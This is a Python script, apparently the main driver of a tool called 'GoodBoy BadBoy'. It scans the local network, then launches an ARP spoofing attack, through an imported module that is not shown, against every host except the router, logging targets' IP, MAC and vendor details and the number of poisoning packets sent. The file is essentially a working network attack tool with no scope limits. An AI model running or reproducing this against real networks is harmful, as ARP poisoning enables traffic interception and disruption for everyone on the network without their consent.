#! /usr/bin/env python3

from support_files import common
from random import randint as random
from datetime import datetime
import os

ROUTER = {'ip': "IP", 'netmask': 24}
IP = ""
WHICH_BOY = ""
INTERFACE = ""
SPECIFIC_TARGETS = []
VERBOSE = ""
LOG_FILE = open("logs/{0}.txt".format(datetime.now().strftime("%d-%m-%Y")), 'at')
DT_FORMAT = "%H:%M:%S"
PORT_SCAN = ''
CHECK_PORT_ONLINE = ''
IDS = ''
BAD_ARGUMENTS = ''


def do_arp(target, report_file):
    arp_spoofer = common.ARPAttack(INTERFACE, target, ROUTER, LOG_FILE, VERBOSE, report_file)
    packets_count = arp_spoofer.start_arp()
    return packets_count


def main():
    try:
        os.mkdir("logs")
        os.mkdir("reports")
    except FileExistsError:
        pass

    try:
        global ROUTER

        print("[+] Initializing GoodBoy BadBoy Program...")
        LOG_FILE.write("[{0}] Initializing GoodBoy BadBoy Program...".format(datetime.now().strftime(DT_FORMAT)))

        common_obj = common.Main(ROUTER, INTERFACE, SPECIFIC_TARGETS, VERBOSE, LOG_FILE)
        networks, ROUTER = common_obj.get_targets_info()

        LOG_FILE.write("\n[{0}] Scan Results: {1}".format(datetime.now().strftime(DT_FORMAT), networks))

        while len(networks) != 0:

            target = networks[random(0, len(networks) - 1)]
            networks.remove(target)

            if target['ip'] != ROUTER['ip']:

                print("\n\n[+] Working on IP: {0}".format(target['ip']))

                file_name = target['ip'].replace(".", "-")
                location = "reports/{0}".format(file_name)

                try:
                    os.mkdir(location)
                except FileExistsError:
                    pass

                report_file = open("{0}/{1}.txt".format(location, datetime.now().strftime("%d-%m-%Y")), 'at')
                report_file.write("[{0}] Target Details -> IP: {1}, MAC: {2}, VENDOR: {3}"
                                  .format(datetime.now().strftime(DT_FORMAT),
                                          target['ip'],
                                          target['mac'],
                                          target['vendor']))

                LOG_FILE.write("\n[{0}] Working on: {1}".format(datetime.now().strftime(DT_FORMAT), target))

                packets_sent = do_arp(target, report_file)
                report_file.write("\n[{0}] Total ARP Packets Sent: {1}"
                                  .format(datetime.now().strftime(DT_FORMAT), packets_sent))
                report_file.close()

        print("[+] Program is shutting down...")
        LOG_FILE.write("\n[{0}] Program is shutting down...\n\n".format(datetime.now().strftime(DT_FORMAT)))

    except KeyboardInterrupt:
        print("[-] Program is stopped by the user...")
        LOG_FILE.write("\n[{0}] Program is stopped by the user...\n\n".format(datetime.now().strftime(DT_FORMAT)))

    except BaseException as e:
        print("[-] Error: {0}".format(e))
        LOG_FILE.write("\n[{0}] Error: {1}\n\n".format(datetime.now().strftime(DT_FORMAT), e))

    finally:
        LOG_FILE.close()


###################################################
if __name__ == "__main__":
    main()
